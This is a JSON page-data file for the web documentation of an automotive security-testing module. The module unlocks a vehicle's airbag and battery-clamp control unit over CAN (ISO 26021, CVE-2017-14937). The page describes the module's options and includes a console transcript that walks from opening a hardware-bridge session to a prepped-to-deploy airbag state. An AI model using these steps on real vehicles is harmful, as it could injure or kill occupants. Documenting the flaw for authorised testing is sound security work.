{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/post/hardware/automotive/pdt","result":{"data":{"moduleMetadataJson":{"id":"ce12ccd5-e642-51ce-ae8a-9dad489d9736","name":"Check For and Prep the Pyrotechnic Devices (Airbags, Battery Clamps, etc.)","fullname":"post/hardware/automotive/pdt","description":"Acting in the role of a Pyrotechnical Device Deployment Tool (PDT), this module\n                               will first query all Pyrotechnic Control Units (PCUs) in the target vehicle\n                               to discover how many pyrotechnic devices are present, then attempt to validate\n                               the security access token using the default simplified algorithm.  On success,\n                               the vehicle will be in a state that is prepped to deploy its pyrotechnic devices\n                               (e.g. airbags, battery clamps, etc.) via the service routine. (ISO 26021)","rank":300,"fields":{"detailsSlug":"/modules/details/post/hardware/automotive/pdt","documentationSlug":"/modules/documentation/post/hardware/automotive/pdt"},"documentation":{"html":"<p>Acting in the role of a Pyrotechnical Device Deployment Tool (PDT), this module will first query all Pyrotechnic Control Units (PCUs) in the target vehicle to discover how many pyrotechnic devices are present, then attempt to validate the security access token using the default simplified algorithm.  On success, the vehicle will be in a state that is prepped to deploy its pyrotechnic devices (e.g. airbags, battery clamps, etc.) via the service routine. (ISO 26021)</p>\n<p>This module is based on research by Johannes Braun and Juergen Duerrwang, which you can read more about <a href=\"https://www.researchgate.net/publication/321183727_Security_Evaluation_of_an_Airbag-ECU_by_Reusing_Threat_Modeling_Artefacts\">here</a> along with related <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14937\">CVE-2017-14937</a>.</p>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>SRCID</strong></p>\n<p>  This is the SRC CAN ID for the PCU connection.  Default is 0x7F1.</p>\n<p>  <strong>DSTID</strong></p>\n<p>  This is the CAN ID of the expected response.  Default is 0x7F9.</p>\n<p>  <strong>CANBUS</strong></p>\n<p>  Determines which CAN bus to communicate on.  Type 'supported_buses' for valid options.</p>\n<p>  <strong>PADDING</strong></p>\n<p>  Optional byte-value to use for padding all CAN bus packets to an 8-byte length.  Padding is disabled by default.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>  A successful unlock and prepped-to-deploy of pyrotechnic devices in a target vehicle:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">$ ./msfconsole -q\nmsf &gt; use auxiliary/server/local_hwbridge\nmsf auxiliary(local_hwbridge) &gt; set uripath /\nuripath =&gt; /\nmsf auxiliary(local_hwbridge) &gt; run\n[*] Auxiliary module running as background job 0.\n\n[*] Using URL: http://0.0.0.0:8080/\n[*] Local IP: http://10.0.2.4:8080/\n[*] Server started.\n\nmsf auxiliary(local_hwbridge) &gt; use auxiliary/client/hwbridge/connect\nmsf auxiliary(connect) &gt; run\n\n[*] Attempting to connect to 127.0.0.1...\n[*] Hardware bridge interface session 1 opened (127.0.0.1 -&gt; 127.0.0.1) at 2017-12-17 10:41:27 -0600\n[+] HWBridge session established\n[*] HW Specialty: {&quot;automotive&quot;=&gt;true}  Capabilities: {&quot;can&quot;=&gt;true, &quot;custom_methods&quot;=&gt;true}\n[!] NOTICE:  You are about to leave the matrix.  All actions performed on this hardware bridge\n[!]          could have real world consequences.  Use this module in a controlled testing\n[!]          environment and with equipment you are authorized to perform testing on.\n[*] Auxiliary module execution completed\n\nmsf auxiliary(connect) &gt; sessions -i 1\n[*] Starting interaction with 1...\n\nhwbridge &gt;\nhwbridge &gt; run post/hardware/automotive/pdt canbus=&lt;target CAN bus&gt;\n\n[*] Gathering Data...\n[*]  VIN: 5555\n[*] Loop info (1 pyrotechnic devices):\n[*]   69 | battery clamp main battery\n[*]      |  Deployment Status: Fail ()\n[*]  Number of PCUs in vehicle     | 1\n[*]  Info About First PCU\n[*]  Address format this PCU(s)    | 11 bit normal addressing\n[*]  Number of pyrotechnic charges | 1\n[*]  Version of ISO26021 standard  | 1\n[*]  ACL type                      | CAN only\n[*]  ACL Type version              | 1\n[*]\n[*] Switching to Diagnostic Session 0x04...\n[*] Getting Security Access Seed...\n[*] Success.  Seed: [&quot;01&quot;, &quot;CF&quot;, &quot;00&quot;, &quot;00&quot;, &quot;00&quot;]\n[*] Attempting to unlock device...\n[*] Success!\n[!] Warning! You are now able to start the deployment of airbags in this vehicle\n[!] *** OCCUPANTS OF THE VEHICLE FACE POTENTIAL DEATH OR INJURY ***</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"ce12ccd5-e642-51ce-ae8a-9dad489d9736"}}}